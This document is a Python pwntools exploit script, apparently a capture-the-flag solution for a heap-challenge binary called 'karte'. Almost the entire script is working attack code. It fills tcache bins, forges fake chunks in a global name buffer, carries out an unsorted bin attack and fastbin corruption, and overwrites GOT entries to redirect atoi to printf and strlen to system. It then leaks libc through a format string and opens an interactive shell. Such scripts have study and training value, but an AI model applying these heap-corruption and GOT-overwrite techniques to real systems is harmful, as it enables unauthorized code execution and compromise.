from pwn import *


def debug(func):
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(size, desc):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Input size > ', str(size))
    io.sendafter(b'Input description > ', desc)
    io.recvuntil(b'Added id ')
    id_ = io.recvline()
    io.recvuntil('Done.')
    return int(id_)


@debug
def delete(id_):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Input id > ', str(id_))
    data = io.recvuntil('Done.')
    assert b'Deleted' in data


@debug
def modify(id_, desc):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Input id > ', str(id_))
    io.sendafter(b'Input new description > ', desc)
    data = io.recvuntil('Done.')
    assert b'Modified' in data


@debug
def rename(name):
    io.sendlineafter(b'> ', b'99')
    io.sendafter(b'name... ', name)


addr_name = 0x00000000006021A0
addr_list = 0x0000000000602140
def solve():
    name = b''
    name += p64(0)
    name += p64(0x71)
    name += p64(addr_name + 0x50)
    io.sendafter(b'name...', name)

    # fill tcache
    for i in range(7):
        x = add(0x68, str(i))
        delete(x)
    for i in range(7):
        x = add(0x88, str(i))
        delete(x)

    x = add(0x68, b'A' * 8)
    y = add(0x68, b'B' * 8)
    delete(x)
    delete(y)
    # Depending on the ASLR, heap address can be less or more than 3 bytes.
    # In this exploit we assume that the heap address is 3 bytes long.
    modify(y, p64(addr_name)[:3])
    z = add(0x68, b'C' * 8)  # consume

    payload = b''
    payload += b'D' * 0x40
    payload += p64(0)
    payload += p64(0x71)
    x = add(0x68, payload)  # create fake chunk at addr_name + 0x50

    payload = b''
    payload += b'E' * 0x38
    payload += p64(0x21)
    payload += b'F' * 0x18
    payload += p64(0x21)
    # this returns chunk at addr_name + 0x50
    # adjust so the entire `name` will become a legitimate chunk.
    y = add(0x68, payload)

    # rename the chunk header at `name` to change the size to 0x90
    rename(p64(0) + p64(0x91))
    print("Delete small bin")
    # delete fake chunk (size = 0x90)
    # this connects to unsorted bin list
    delete(x)

    print("Overwrite bk")
    payload = b''
    payload += p64(0)
    payload += p64(0x91)
    # fd can be anything.
    # Although this will break unsorted bin list,
    # it will not cause the program to stop.
    # Remember that `unsorted bin attack` is different from
    # unsafe unlink, which requires both fd & bk to be legitimate.
    payload += p64(0)  # fd
    payload += p64(addr_list - 0x28 + 3)  # bk
    rename(payload)

    print("Carry out unsorted bin attack")
    # carry out unsorted bin attack!!
    # this will *(addr_list - 0x10 + 3) = &main_arena.bins[0]
    # which we can use as size for fastbins attack.
    payload = b''  # create chunk at the end of the freeing chunk
    payload += b'G' * 0x68
    payload += p64(0x21)  # size
    x = add(0x88, payload)

    delete(z)
    rename(p64(0) + p64(0x71))
    delete(x)
    rename(p64(0) + p64(0x71) + p64(addr_list-0x18))
    add(0x68, b'H' * 8)

    payload = b''
    payload += b'/bin/sh\x00'
    #          flag     id       ptr
    payload += p32(1) + p32(1) + p64(elf.got["atoi"])
    payload += p32(1) + p32(2) + p64(0xdeaddeadbeefbeef)
    payload += p32(1) + p32(3) + p64(elf.got["strlen"])
    payload += p64(0xDEADC0BEBEEF)  # lock
    print("Return pointer to list")
    id_ = add(0x68, payload)  # return addr_list and overwrite list and lock!!

    # overwrite atoi to printf
    # now atoi will be printf.
    # use that printf returns the number of characters printed to mock atoi.
    modify(1, p64(elf.plt["printf"])[:6])

    # leak libc
    io.sendafter("> ", "%19$08pAAAA")
    data = io.recvuntil("AAAA")
    addr_libc = int(data[:data.rfind(b"AAAA")], 16) - 0x21b97
    io.recvuntil("Wrong input.")
    print("addr_libc = 0x{:x}".format(addr_libc))

    # modify (overwrite strlen to system)
    io.sendlineafter(b"> ", b"4   ")  # choose modify
    io.sendafter(b"Input id > ", b"3  ")  # id
    io.sendafter(b"Input new description > ", p64(addr_libc + libc.symbols["system"])[:6])

    # system("/bin/sh")
    io.sendafter(b"> ", b"4   ")  # choose modify
    io.sendafter(b"Input id > ", "%{}c".format(id_))  # id

    io.interactive()


if __name__ == '__main__':
    binpath = './karte'
    elf = ELF(binpath)
    libc = elf.libc
    context.binary = elf
    # context.log_level = "debug"
    context.terminal = ['tmux', 'split-w', '-h']

    gdbscript = '''
    gef
    # just after menu
    b *0x400A18
    # b add
    # b delete
    # b modify
    # ignore 1 28
    set $entries=0x602140
    set $name=0x00000000006021A0
    '''
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    io = process(binpath)
    while True:
        try:
            solve()
        except EOFError:
            io = process(binpath)
            continue
